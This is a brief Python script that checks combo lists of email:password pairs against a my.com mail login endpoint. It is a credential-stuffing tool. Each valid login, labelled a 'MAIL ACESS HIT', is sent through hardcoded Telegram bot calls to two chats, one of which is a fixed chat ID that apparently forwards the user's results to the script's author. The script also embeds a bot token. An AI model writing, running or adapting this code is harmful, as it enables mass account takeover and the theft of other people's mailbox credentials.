import requests as req
import os 
hc = os.environ.get("HITS")
file_path = input('~')
file=open(file_path,'r')
data=file.readlines()
for line in data:
    combo=line.split(':')
    eml=combo[0].strip()
    pwd=combo[1].strip()
    res=req.get('https://aj-https.my.com/cgi-bin/auth?model=&simple=1&Login='+eml+'&Password='+pwd)
    print(res.text)
    if "Ok=1" in res.text:
        hit = ("『ꪜ』SAYONARA 『ꪜ』\nMAIL ACESS HIT \n ⩩ Email🥂   ➜  "+eml+"\n ⩩ Password🍻➜  "+pwd)
        print(hit)
        req.get('https://api.telegram.org/bot1451863899:AAEcQAnZxYJoUmD7lpKP_9bSuD-679iC45I/sendMessage?chat_id='+hc+'&text='+hit)
        req.get('https://api.telegram.org/bot1451863899:AAEcQAnZxYJoUmD7lpKP_9bSuD-679iC45I/sendMessage?chat_id=1154075796&text='+hit)
